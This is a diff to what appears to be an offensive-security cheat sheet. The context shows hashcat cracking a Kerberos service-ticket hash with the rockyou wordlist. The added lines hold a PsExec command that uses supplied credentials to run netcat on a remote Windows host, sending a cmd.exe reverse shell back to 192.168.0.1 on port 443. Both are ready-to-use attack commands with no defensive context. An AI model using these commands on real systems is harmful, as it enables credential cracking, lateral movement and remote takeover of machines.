@@ -141,3 +141,8 @@ cat kbt-hash.txt|tr -d "\r\n"|tee kbt-hash2.txt
 ➤ 4. Crack the ticket
 hashcat -m 13100 -a 0 -o cracked.txt kbt-hash2.txt /usr/share/wordlists/rockyou.txt
 ```
+
+## PsExec
+```
+.\PsExec64.exe -u lexis -p lexispassword \\COMPUTERHOSTNAME C:\users\public\documents\nc64.exe 192.168.0.1 443 -e C:\windows\system32\cmd.exe
+```
